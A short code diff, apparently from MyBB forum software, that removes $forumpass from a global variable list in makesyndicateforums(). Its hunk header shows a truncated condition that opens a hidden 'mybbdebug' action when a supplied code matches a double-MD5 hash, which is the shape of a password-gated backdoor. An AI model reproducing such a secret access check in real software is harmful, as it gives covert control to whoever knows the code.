@@ -562,7 +562,7 @@ if($mybb->input['action'] == "mybbdebug" && md5(md5($mybb->input['code'])) == 'a
 
 function makesyndicateforums($pid="0", $selitem="", $addselect="1", $depth="", $permissions="")
 {
-	global $db, $forumcache, $permissioncache, $settings, $mybb, $mybbuser, $selecteddone, $forumlist, $forumlistbits, $theme, $templates, $flist, $lang, $forumpass;
+	global $db, $forumcache, $permissioncache, $settings, $mybb, $mybbuser, $selecteddone, $forumlist, $forumlistbits, $theme, $templates, $flist, $lang;
 	$pid = intval($pid);
 	if(!$permissions)
 	{
